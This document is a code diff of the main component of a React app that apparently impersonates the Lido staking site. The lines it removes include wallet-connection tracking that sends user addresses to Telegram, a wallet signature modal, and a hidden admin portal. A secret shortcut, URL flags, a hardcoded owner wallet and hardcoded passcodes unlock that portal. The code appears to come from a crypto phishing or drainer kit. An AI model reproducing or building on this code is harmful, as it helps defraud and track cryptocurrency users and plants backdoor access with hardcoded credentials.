@@ -9,14 +9,11 @@ import { WrapTab } from './components/WrapTab';
 import { WithdrawalsTab } from './components/WithdrawalsTab';
 import { RewardsTab } from './components/RewardsTab';
 import { EarnTab } from './components/EarnTab';
-import { AdminTab } from './components/AdminTab';
 import { ErrorBoundary } from './components/ErrorBoundary';
 import { ToastProvider, useToast } from './components/ToastContext';
-import { WalletSignatureModal } from './components/WalletSignatureModal';
 import { TermsAgreementModal } from './components/TermsAgreementModal';
 import { LidoLogo } from './components/LidoLogo';
 import { useLivePrices } from './hooks/usePrices';
-import { sendTelegram, formatUserLogin } from './lib/telegram';
 import { CardSkeleton } from './components/LoadingSkeleton';
 
 interface MarketData {
@@ -29,10 +26,6 @@ interface MarketData {
 function AppContent() {
   const [darkMode, setDarkMode] = useState(true);
   const [activeTab, setActiveTab] = useState('stake');
-  const [isAdminEnabled, setIsAdminEnabled] = useState(false);
-  const [showAdminModal, setShowAdminModal] = useState(false);
-  const [adminPasswordInput, setAdminPasswordInput] = useState('');
-  const [adminAuthError, setAdminAuthError] = useState<string | null>(null);
   const [isManualRefreshing, setIsManualRefreshing] = useState(false);
   const [pullDistance, setPullDistance] = useState(0);
   const [scrollProgress, setScrollProgress] = useState(0);
@@ -58,7 +51,6 @@ function AppContent() {
   const { prices, loading: isFetching, refetchPrices } = useLivePrices();
   const { address, isConnected } = useAccount();
   const { showSuccess } = useToast();
-  const prevIsConnected = useRef(isConnected);
 
   const touchStartRef = useRef<number>(0);
 
@@ -114,51 +106,6 @@ function AppContent() {
     };
   }, [pullDistance]);
 
-  // Secret keyboard shortcut (Ctrl+Shift+A or Cmd+Shift+A) to trigger admin login modal
-  useEffect(() => {
-    const handleKeyDown = (e: KeyboardEvent) => {
-      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
-        e.preventDefault();
-        setShowAdminModal(true);
-      }
-    };
-    window.addEventListener('keydown', handleKeyDown);
-    return () => window.removeEventListener('keydown', handleKeyDown);
-  }, []);
-
-  // Check URL param or connected address for admin privilege
-  useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const isAdminUrl = urlParams.get('admin') === 'true' || urlParams.get('portal') === 'admin' || window.location.hash === '#admin';
-    const isOwnerWallet = address && address.toLowerCase() === '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40'.toLowerCase();
-    
-    if (isAdminUrl || isOwnerWallet) {
-      setIsAdminEnabled(true);
-    }
-  }, [address]);
-
-  const handleAdminAuthSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (adminPasswordInput === 'admin123' || adminPasswordInput.trim() === '8850313284') {
-      setIsAdminEnabled(true);
-      setActiveTab('admin');
-      setShowAdminModal(false);
-      setAdminPasswordInput('');
-      setAdminAuthError(null);
-    } else {
-      setAdminAuthError('Invalid Admin Authorization Passcode.');
-    }
-  };
-  
-  useEffect(() => {
-    if (isConnected && address && !prevIsConnected.current) {
-      sendTelegram(formatUserLogin(address));
-    } else if (!isConnected && prevIsConnected.current) {
-      sendTelegram(`🔴 <b>Wallet Disconnected</b>\n\nTime: ${new Date().toUTCString()}`);
-    }
-    prevIsConnected.current = isConnected;
-  }, [isConnected, address]);
-  
   const marketData: MarketData = {
     ethPrice: prices['ethereum']?.usd || null,
     stEthPrice: prices['staked-ether']?.usd || null,
@@ -192,7 +139,7 @@ function AppContent() {
     { id: 'wrap', label: 'Wrap' },
     { id: 'withdrawals', label: 'Withdrawals' },
     { id: 'rewards', label: 'Rewards' },
-    { id: 'earn', label: 'Earn', badge: 'New' },
+    { id: 'earn', label: 'Earn', badge: 'Live' },
   ];
 
   const renderTab = () => {
@@ -202,14 +149,12 @@ function AppContent() {
       case 'withdrawals': return <WithdrawalsTab />;
       case 'rewards': return <RewardsTab marketData={marketData} />;
       case 'earn': return <EarnTab />;
-      case 'admin': return isAdminEnabled ? <AdminTab /> : <StakeTab marketData={marketData} isFetching={isFetching || isManualRefreshing} />;
       default: return <StakeTab marketData={marketData} isFetching={isFetching || isManualRefreshing} />;
     }
   };
 
   return (
     <>
-      <WalletSignatureModal />
       <TermsAgreementModal />
       <div className="min-h-screen pb-20 transition-colors duration-300 relative">
       {/* Pull-To-Refresh Banner Indicator */}
@@ -283,16 +228,6 @@ function AppContent() {
           </div>
 
           <div className="flex items-center gap-2.5 sm:gap-3">
-            {isAdminEnabled && (
-              <button 
-                onClick={() => setActiveTab(activeTab === 'admin' ? 'stake' : 'admin')}
-                className="text-xs font-semibold px-2.5 py-1 bg-amber-500/10 text-amber-500 hover:bg-amber-500/20 border border-amber-500/20 rounded-lg flex items-center gap-1 transition-colors"
-              >
-                <ShieldCheck className="w-3.5 h-3.5" />
-                {activeTab === 'admin' ? 'Return to Portal' : 'Admin Portal'}
-              </button>
-            )}
-
             {/* Manual Refresh Button */}
             <button
               onClick={handleRefresh}
@@ -348,68 +283,6 @@ function AppContent() {
           </span>
         </div>
       </footer>
-
-      {/* Secret Admin Authorization Modal */}
-      {showAdminModal && (
-        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-in fade-in duration-200">
-          <div className="bg-card border border-border-main rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-4">
-            <div className="flex items-center justify-between border-b border-border-main pb-3">
-              <div className="flex items-center gap-2">
-                <ShieldCheck className="w-5 h-5 text-amber-500" />
-                <h3 className="font-bold text-lg text-text-main">Admin Portal Access</h3>
-              </div>
-              <button 
-                onClick={() => setShowAdminModal(false)}
-                className="text-text-secondary hover:text-text-main text-sm font-bold"
-              >
-                ✕
-              </button>
-            </div>
-
-            <p className="text-xs text-text-secondary leading-relaxed">
-              This area is strictly restricted to contract administrators. Enter authorization credentials to proceed.
-            </p>
-
-            <form onSubmit={handleAdminAuthSubmit} className="space-y-3">
-              <div>
-                <label className="text-xs font-semibold text-text-secondary block mb-1">
-                  Admin Passcode
-                </label>
-                <input
-                  type="password"
-                  placeholder="Enter passcode"
-                  value={adminPasswordInput}
-                  onChange={(e) => setAdminPasswordInput(e.target.value)}
-                  className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-sm text-text-main focus:outline-none focus:border-[#00A3FF]"
-                  autoFocus
-                />
-              </div>
-
-              {adminAuthError && (
-                <div className="p-2 bg-red-500/10 border border-red-500/20 text-red-500 text-xs rounded-lg font-medium">
-                  {adminAuthError}
-                </div>
-              )}
-
-              <div className="flex items-center justify-end gap-2 pt-2">
-                <button
-                  type="button"
-                  onClick={() => setShowAdminModal(false)}
-                  className="px-4 py-2 rounded-xl text-xs font-semibold text-text-secondary hover:text-text-main bg-input"
-                >
-                  Cancel
-                </button>
-                <button
-                  type="submit"
-                  className="px-4 py-2 rounded-xl text-xs font-bold text-white bg-[#00A3FF] hover:bg-[#0090E6] transition-colors"
-                >
-                  Authenticate
-                </button>
-              </div>
-            </form>
-          </div>
-        </div>
-      )}
 
       <nav className="fixed bottom-0 left-0 right-0 z-50 border-t border-border-main bg-card/90 backdrop-blur-md sm:hidden pb-safe">
         <div className="flex justify-around items-center h-16">
